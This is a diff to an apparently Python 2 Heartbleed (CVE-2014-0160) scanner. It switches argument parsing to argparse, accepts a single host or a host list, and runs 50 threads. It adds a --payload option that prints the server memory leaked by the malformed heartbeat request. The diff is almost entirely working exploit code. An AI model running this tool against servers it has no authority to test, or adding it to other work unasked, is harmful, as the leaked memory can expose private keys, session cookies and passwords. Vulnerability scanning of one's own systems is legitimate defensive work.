@@ -15,11 +15,9 @@ import socket
 import time
 import select
 import re
-from optparse import OptionParser
 import os
-
-options = OptionParser(usage='%prog serverlist [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
-opts, args = options.parse_args()
+import argparse
+from pprint import pprint
 
 def h2bin(x):
     return x.replace(' ', '').replace('\n', '').decode('hex')
@@ -47,13 +45,17 @@ hb = h2bin('''
 01 40 00
 ''')
 
+payload = False
+
+
 def hexdump(s):
     for b in xrange(0, len(s), 16):
-        lin = [c for c in s[b : b + 16]]
+        lin = [c for c in s[b: b + 16]]
         hxdat = ' '.join('%02X' % ord(c) for c in lin)
-        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
+        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.') for c in lin)
         print '  %04x: %-48s %s' % (b, hxdat, pdat)
     print
+
 
 def recvall(s, length, timeout=5):
     endtime = time.time() + timeout
@@ -85,6 +87,7 @@ def recvmsg(s):
 
     return typ, ver, pay
 
+
 def hit_hb(s, url):
     s.send(hb)
     while True:
@@ -95,6 +98,8 @@ def hit_hb(s, url):
 
         if typ == 24:
             if len(pay) > 3:
+                if payload:
+                    print ''.join((c if 32 <= ord(c) <= 126 else ' ')for c in pay)
                 print_result(url, "vulnerable")
             else:
                 print_result(url, "safe")
@@ -104,21 +109,23 @@ def hit_hb(s, url):
             print_result(url, "safe")
             return False
 
+
 def print_result(url, message):
     print "| {0:40} | {1:40} |".format(url, message)
+
 
 def ssl_check(check_url):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(5)
     sys.stdout.flush()
     try:
-        s.connect((check_url, 443)) # Testing 443 as default *hardcoded*
+        s.connect((check_url, 443))  # Testing 443 as default *hardcoded*
         sys.stdout.flush()
         s.send(hello)
         sys.stdout.flush()
         while True:
             typ, ver, pay = recvmsg(s)
-            if typ == None:
+            if typ is None:
                 return
             # Look for server hello done message.
             if typ == 22 and ord(pay[0]) == 0x0E:
@@ -131,6 +138,7 @@ def ssl_check(check_url):
     except Exception as e:
         print_result(check_url, 'error: ' + str(e))
 
+
 def worker(queue):
     queue_full = True
     while queue_full:
@@ -140,22 +148,31 @@ def worker(queue):
         except Queue.Empty:
             queue_full = False
 
-def start():
-    hostnames = open((os.getcwd() + '/' + args[0])).read().splitlines()
+
+def start(args):
+    global payload
+    payload = args.payload
+
+    target = args.target
+    filename = os.getcwd() + '/' + target
+    if os.path.isfile(filename):
+        hostnames = open(filename).read().splitlines()
+    else:
+        hostnames = [target]
     q = Queue.Queue()
     for url in hostnames:
         q.put(url)
     thread_count = 50
     for i in range(thread_count):
-        t = threading.Thread(target=worker, args = (q,))
+        t = threading.Thread(target=worker, args=(q,))
         t.start()
 
+
 def main():
-    opts, args = options.parse_args()
-    if len(args) < 1:
-        options.print_help()
-        return
-    start()
+    parser = argparse.ArgumentParser(description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
+    parser.add_argument('target', help='either a file with newline separated servers or one server directly')
+    parser.add_argument('--payload', help='print the payload', action='store_true', default=False)
+    start(parser.parse_args())
 
 if __name__ == '__main__':
     main()
